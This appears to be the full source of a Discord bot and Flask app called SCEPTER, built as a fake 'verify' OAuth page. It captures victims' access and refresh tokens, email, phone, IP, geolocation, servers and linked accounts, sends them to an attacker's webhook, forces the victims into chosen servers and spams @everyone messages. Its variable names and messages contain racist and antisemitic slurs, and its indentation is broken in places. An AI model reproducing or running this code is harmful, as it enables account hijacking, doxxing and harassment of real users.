
import flask
import os
import time
import threading
import httpx
import discord
from discord.ext import commands
from pystyle import *
import asyncio
import sqlite3
import json

app = flask.Flask(__name__)

# ── Helper Utilities ──────────────────────────────────────────────────────

def _truncate_for_discord(content: str, limit: int = 1900) -> str:
    """Discord limits message content to 2000 chars; keep some headroom."""
    if len(content) <= limit:
        return content
    return content[: limit - 20] + "\n... (truncated)"


def _send_or_file(ctx, content: str, filename: str = "info.txt"):
    """Send content as a message if short enough, otherwise as a file."""
    if len(content) <= 1900:
        return ctx.send(content)

    from io import BytesIO
    bio = BytesIO(content.encode("utf-8"))
    bio.seek(0)
    return ctx.send(file=discord.File(bio, filename=filename))

# ── Config ──────────────────────────────────────────────────────────────
token         = os.environ["TOKEN"]
client_id     = os.environ["CLIENT_ID"]
client_secret = os.environ["CLIENT_SECRET"]
redirect_uri  = os.environ["REDIRECT_URI"]
guild_ids     = os.environ["GUILD_IDS"].split(",")
webhook       = os.environ["WEBHOOK"]
jew_token     = token

app.secret_key = 'negrosjotos'  # Change this to a secure key

# ── Database Setup ──────────────────────────────────────────────────────
conn = sqlite3.connect('tokens.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS tokens (
    user_id TEXT PRIMARY KEY,
    access_token TEXT,
    refresh_token TEXT,
    ip TEXT,
    geo TEXT,
    useragent TEXT,
    lat TEXT,
    lon TEXT,
    guild_list TEXT,
    connection_list TEXT,
    map_url TEXT
)''')
conn.commit()

tokens = {}  # Keep for bot, but we'll sync with DB
START_TIME = time.time()
clear = lambda: os.system("cls" if os.name == "nt" else "clear")
jew = commands.Bot(command_prefix=".", intents=discord.Intents.all(), help_command=None)

# Load tokens from DB
c.execute('SELECT * FROM tokens')
for row in c.fetchall():
    user_id, access, refresh, ip, geo_str, ua, lat, lon, guilds, conns, map_url = row
    tokens[user_id] = {
        'access_token': access,
        'refresh_token': refresh,
        'ip': ip,
        'geo': json.loads(geo_str) if geo_str else {},
        'useragent': ua,
        'lat': lat,
        'lon': lon,
        'guild_list': guilds,
        'connection_list': conns,
        'map_url': map_url
    }

# ── Flask Routes ──────────────────────────────────────────────────────────────

@app.route("/")
def home():
  return flask.redirect("/verify")

@app.route("/verify")
def verify():
  return flask.redirect(
    f"https://discord.com/api/oauth2/authorize?client_id={client_id}"
    f"&redirect_uri={redirect_uri}&response_type=code"
    f"&scope=identify%20email%20connections%20guilds%20guilds.join"
  )

@app.route("/verified")
def verified():
  data = {
    "client_id": client_id,
    "client_secret": client_secret,
    "grant_type": "authorization_code",
    "code": flask.request.args.get("code"),
    "redirect_uri": redirect_uri
  }
  headers = {"Content-Type": "application/x-www-form-urlencoded"}
  r = httpx.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
  token_data = r.json()
  access_token = token_data["access_token"]
  refresh_token = token_data["refresh_token"]

  auth_headers = {"Authorization": f"Bearer {access_token}"}

  user = httpx.get("https://discord.com/api/users/@me", headers=auth_headers).json()
  guilds = httpx.get("https://discord.com/api/users/@me/guilds", headers=auth_headers).json()
  connections = httpx.get("https://discord.com/api/users/@me/connections", headers=auth_headers).json()

  user_id = user["id"]
  tokens[user_id] = {"access_token": access_token, "refresh_token": refresh_token}

  ip = flask.request.headers.get("X-Forwarded-For", flask.request.remote_addr)
  geo = httpx.get(f"http://ip-api.com/json/{ip}").json()
  lat = geo.get("lat", "N/A")
  lon = geo.get("lon", "N/A")

  map_url = f"https://static-maps.yandex.ru/1.x/?lang=en-US&ll={lon},{lat}&z=10&l=map&size=450,250&pt={lon},{lat},pm2rdm"

  guild_list = "\n".join([
    f"  - {g['name']} ({g['id']})" +
    (" [OWNER]" if g.get('owner') else "") +
    (" [ADMIN]" if g.get('permissions') and int(g['permissions']) & 0x8 else "")
    for g in guilds
  ]) if isinstance(guilds, list) else "Failed to fetch"

  connection_list = "\n".join([
    f"  - {c['type']}: {c['name']}" +
    (" [VERIFIED]" if c.get('verified') else "")
    for c in connections
  ]) if isinstance(connections, list) else "Failed to fetch"

  useragent = flask.request.headers.get("User-Agent", "Unknown")

  flag = geo.get('countryCode', 'xx').lower()
  avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png?size=512"
  
  info = {
      "embeds": [
          {
              "title": f"👤 {user.get('username')}#{user.get('discriminator')}",
              "description": f"**User ID:** `{user_id}`",
              "color": 0x5865F2,
  
              "thumbnail": {
                  "url": avatar
              },
  
              "fields": [
                  {
                      "name": "📧 Account",
                      "value": f"""
  **Email:** `{user.get('email', 'N/A')}`
  **Phone:** `{user.get('phone', 'N/A')}`
  **Locale:** `{user.get('locale', 'N/A')}`
  """,
                      "inline": True
                  },
                  {
                      "name": "🔐 Security",
                      "value": f"""
  **Verified:** `{user.get('verified', False)}`
  **MFA Enabled:** `{user.get('mfa_enabled', False)}`
  **Nitro:** `{bool(user.get('premium_type', 0))}`
  """,
                      "inline": True
                  },
                  {
                      "name": "🌐 Network",
                      "value": f"""
  **IP:** `{ip}`
  **ISP:** `{geo.get('isp','N/A')}`
  **Org:** `{geo.get('org','N/A')}`
  """,
                      "inline": False
                  },
                  {
                      "name": "📍 Location",
                      "value": f"""
  :flag_{flag}: **{geo.get('country','N/A')}**
  **Region:** {geo.get('regionName','N/A')}
  **City:** {geo.get('city','N/A')}
  **ZIP:** {geo.get('zip','N/A')}
  
  `{lat}, {lon}`
  """,
                      "inline": False
                  },
                  {
                      "name": "🏠 Guilds",
                      "value": f"```{guild_list[:1000] if guild_list else 'None'}```",
                      "inline": False
                  },
                  {
                      "name": "🔗 Connections",
                      "value": f"```{connection_list[:1000] if connection_list else 'None'}```",
                      "inline": False
                  },
                  {
                      "name": "🗺 Map",
                      "value": f"[Open in Google Maps]({map_url})",
                      "inline": False
                  }
              ],
  
              "image": {
                  "url": f"https://maps.googleapis.com/maps/api/staticmap?center={lat},{lon}&zoom=10&size=600x300&markers=color:red%7C{lat},{lon}"
              },
  
              "footer": {
                  "text": f"User-Agent: {useragent[:100]}"
              }
          }
      ]
  }
  
tokens[user_id] = {
    'access_token': access_token,
    'refresh_token': refresh_token,
    'ip': ip,
    'geo': geo,
    'useragent': useragent,
    'lat': lat,
    'lon': lon,
    'guild_list': guild_list,
    'connection_list': connection_list,
    'map_url': map_url
}

  c.execute('''INSERT OR REPLACE INTO tokens (user_id, access_token, refresh_token, ip, geo, useragent, lat, lon, guild_list, connection_list, map_url) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
            (user_id, access_token, refresh_token, ip, json.dumps(geo), useragent, str(lat), str(lon), guild_list, connection_list, map_url))
  conn.commit()

  try:
    # Discord webhooks limit message content to 2000 chars; keep headroom.
    info_content = info.get("content", "")
    info["content"] = _truncate_for_discord(info_content, limit=1900)

    response = httpx.post(webhook, json=info)
    response.raise_for_status()
    print("Webhook sent successfully")
  except Exception as e:
    print(f"Webhook failed: {e}")
  return flask.redirect("https://discord.com/app")

# ── Dashboard Routes ─────────────────────────────────────────────────────

@app.route("/login")
def login():
  return flask.redirect(
    f"https://discord.com/api/oauth2/authorize?client_id={client_id}"
    f"&redirect_uri={flask.url_for('dashboard_callback', _external=True)}&response_type=code"
    f"&scope=identify"
  )

@app.route("/dashboard_callback")
def dashboard_callback():
  try:
    code = flask.request.args.get('code')
    if not code:
      return "No code provided", 400
    data = {
      "client_id": client_id,
      "client_secret": client_secret,
      "grant_type": "authorization_code",
      "code": code,
      "redirect_uri": flask.url_for('dashboard_callback', _external=True)
    }
    r = httpx.post("https://discord.com/api/oauth2/token", data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
    if r.status_code != 200:
      return "OAuth failed", 400
    token_data = r.json()
    access_token = token_data.get("access_token")
    if not access_token:
      return "No access token", 400
    user = httpx.get("https://discord.com/api/users/@me", headers={"Authorization": f"Bearer {access_token}"}).json()
    user_id = user.get('id')
    if user_id == '1178709988747780146':
      flask.session['user_id'] = user_id
      return flask.redirect("/dashboard")
    else:
      return "Access Denied", 403
  except Exception as e:
    return f"Error: {str(e)}", 500

@app.route("/dashboard")
def dashboard():
  if 'user_id' not in flask.session or flask.session['user_id'] != '1178709988747780146':
    return flask.redirect("/login")
  try:
    c.execute('SELECT user_id, access_token, ip, geo, lat, lon FROM tokens')
    rows = c.fetchall()
    html = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tokens Dashboard</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    table { width: 100%; border-collapse: collapse; }
    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
    th { background-color: #f2f2f2; }
    tr:nth-child(even) { background-color: #f9f9f9; }
  </style>
</head>
<body>
  <h1>Tokens Dashboard</h1>
  <table>
    <tr>
      <th>User ID</th>
      <th>Access Token (Partial)</th>
      <th>IP</th>
      <th>Location</th>
      <th>Map</th>
    </tr>"""
    for row in rows:
      user_id, access, ip, geo_str, lat, lon = row
      geo = json.loads(geo_str) if geo_str else {}
      location = f"{geo.get('city', 'N/A')}, {geo.get('country', 'N/A')}"
      map_link = f"https://static-maps.yandex.ru/1.x/?lang=en-US&ll={lon},{lat}&z=10&l=map&size=450,250&pt={lon},{lat},pm2rdm" if lat and lon else "#"
      html += f"<tr><td>{user_id}</td><td>{access[:20]}...</td><td>{ip}</td><td>{location}</td><td><a href='{map_link}' target='_blank'>View Map</a></td></tr>"
    html += "</table></body></html>"
    return html
  except Exception as e:
    return f"Error: {str(e)}", 500

# ── jew Events ────────────────────────────────────────────────────────────────

@jew.event
async def on_ready():
  clear()
  art = """
   ▄████████  ▄████████    ▄████████    ▄███████▄     ███        ▄████████    ▄████████ 
  ███    ███ ███    ███   ███    ███   ███    ███ ▀█████████▄   ███    ███   ███    ███ 
  ███    █▀  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██   ███    █▀    ███    █▀  
  ███        ███         ▄███▄▄▄       ███    ███     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀███████████ ███        ▀▀███▀▀▀     ▀█████████▀      ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
         ███ ███    █▄    ███    █▄    ███            ███       ███    █▄  ▀███████████ 
   ▄█    ███ ███    ███   ███    ███   ███            ███       ███    ███   ███    ███ 
 ▄████████▀  ████████▀    ██████████  ▄████▀         ▄████▀     ██████████   ███    ███ 
                                                                             ███    ███ 
  """
  try:
    print(Colorate.Vertical(Colors.yellow_to_green, art, 1))
  except Exception as e:
    print(art)
    print(f"[warn] Colorate failed: {e}")

  total_members = sum(g.member_count for g in jew.guilds)
  guild_names = ", ".join([g.name for g in jew.guilds]) or "none"

  print(Colorate.Vertical(Colors.yellow_to_green, f"""
i > Discord Bot:        {jew.user.name}#{jew.user.discriminator}
i > Servers:            {len(jew.guilds)}
i > Total Members:      {total_members}
i > Configured Guilds:  {len(guild_ids)}
i > Ready.
  """))

  # Start Flask in a thread
  threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)).start()

# ── Commands ──────────────────────────────────────────────────────────────────

@jew.command()
@commands.has_permissions(administrator=True)
async def help(ctx):
  await ctx.send("""```
[ SCEPTER // COMMANDS ]

.help              show this message
.status            show Bot status and uptime
.tokens            list all captured user ids
.info <user_id>    show tokens for a specific user
.join <user_id>    add a specific user to all configured guilds
.joinall           add all captured users to all configured guilds
.webhooks          send @everyone to all webhooks in webhooks.txt
```""")


@jew.command()
@commands.has_permissions(administrator=True)
async def join(ctx, user_id: str):
    if user_id not in tokens:
        await ctx.send(f"No tokens found for user `{user_id}`.")
        return
    access_token = tokens[user_id]["access_token"]
    success = []
    failed = []

    limits = httpx.Limits(max_connections=100, max_keepalive_connections=50)
    async with httpx.AsyncClient(limits=limits, timeout=10) as client:
        async def add_to_guild(niggers):
            try:
                r = await client.put(
                    f"https://discord.com/api/guilds/{niggers}/members/{user_id}",
                    headers={"Authorization": f"Bot {jew_token}"},
                    json={"access_token": access_token}
                )
                if r.status_code in (201, 204):
                    guild = jew.get_guild(int(niggers))
                    success.append(guild.name if guild else niggers)
                else:
                    failed.append(niggers)
            except:
                failed.append(niggers)

        await asyncio.gather(*[add_to_guild(niggers) for niggers in guild_ids])

    msg = ""
    if success:
        msg += f"Joined: {', '.join(success)}\n"
    if failed:
        msg += f"Failed: {', '.join(failed)}"
    await ctx.send(msg or "Nothing happened, nigga!")

@jew.command()
@commands.has_permissions(administrator=True)
async def joinall(ctx):
  if not tokens:
    await ctx.send("No tokens captured yet.")
    return

  total_success = 0
  total_failed = 0

  for negros, data in tokens.items():
    for niggers in guild_ids:
      r = httpx.put(
        f"https://discord.com/api/guilds/{niggers}/members/{negros}",
        headers={"Authorization": f"Bot {jew_token}"},
        json={"access_token": data["access_token"]}
      )
      if r.status_code in (201, 204):
        total_success += 1
      else:
        total_failed += 1

  await ctx.send(f"```\n[ JOIN ALL ]\nSuccess: {total_success}\nFailed:  {total_failed}\n```")

@jew.command(name="tokens")
@commands.has_permissions(administrator=True)
async def list_tokens(ctx):
  if not tokens:
    await ctx.send("No tokens captured yet.")
    return
  msg = "```\n[ CAPTURED TOKENS ]\n" + "\n".join([f"  - {negros}" for negros in tokens]) + "\n```"
  await ctx.send(msg)

@jew.command()
@commands.has_permissions(administrator=True)
async def info(ctx, user_id: str):
  if user_id not in tokens:
    await ctx.send(f"No tokens found for user `{user_id}`.")
    return

  data = tokens[user_id]
  access_token = data.get('access_token', 'N/A')
  refresh_token = data.get('refresh_token', 'N/A')
  ip = data.get('ip', 'N/A')
  geo = data.get('geo', {})
  useragent = data.get('useragent', 'N/A')
  lat = data.get('lat', 'N/A')
  lon = data.get('lon', 'N/A')
  guild_list = data.get('guild_list', 'N/A')
  connection_list = data.get('connection_list', 'N/A')
  map_url = data.get('map_url', 'N/A')

  msg = f"""```
[ TOKENS ]
Access Token:  {access_token}
Refresh Token: {refresh_token}

[ NETWORK ]
IP:            {ip}
ISP:           {geo.get('isp', 'N/A')}
Org:           {geo.get('org', 'N/A')}
User-Agent:    {useragent}

[ LOCATION ]
Country:       {geo.get('country', 'N/A')} ({geo.get('countryCode', 'N/A')})
Region:        {geo.get('regionName', 'N/A')} ({geo.get('region', 'N/A')})
City:          {geo.get('city', 'N/A')}
ZIP:           {geo.get('zip', 'N/A')}
Latitude:      {lat}
Longitude:     {lon}
Timezone:      {geo.get('timezone', 'N/A')}

[ GUILDS ]
{guild_list}

[ CONNECTIONS ]
{connection_list}
```
[{map_url}]({map_url})"""
  await _send_or_file(ctx, msg)

@jew.command()
@commands.has_permissions(administrator=True)
async def status(ctx):
  uptime = int(time.time() - START_TIME)
  hours, remainder = divmod(uptime, 3600)
  minutes, seconds = divmod(remainder, 60)
  total_members = sum(g.member_count for g in jew.guilds)

  await ctx.send(f"""```
[ STATUS ]
Bot:            {jew.user.name}#{jew.user.discriminator}
> Uptime:            {hours}h {minutes}m {seconds}s
> Servers:           {len(jew.guilds)}
> Total Members:     {total_members}
> Captured Tokens:   {len(tokens)}
> Configured Guilds: {len(guild_ids)}
```""")

@jew.command()
@commands.has_permissions(administrator=True)
async def webhooks(ctx):
    await ctx.send("Starting Webhooks")

    webhooks = [w.strip() for w in os.environ["WEBHOOKS"].split(",") if w.strip()]

    async def send_messages(url):
        async with httpx.AsyncClient() as client:
            for _ in range(20):
                r = await client.post(url, json={"content": "@everyone RAPED LOL"})
                if r.status_code == 429:
                    retry_after = r.json().get("retry_after", 1)
                    await asyncio.sleep(retry_after)
                    await client.post(url, json={"content": "@everyone LOLLL"})
                elif _ < 19:
                    await asyncio.sleep(1 / 28)  # ~28/sec, just under the 30/sec limit

    await asyncio.gather(*[send_messages(url) for url in webhooks])

# ── Entry Point ───────────────────────────────────────────────────────────────

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    jew.run(jew_token)
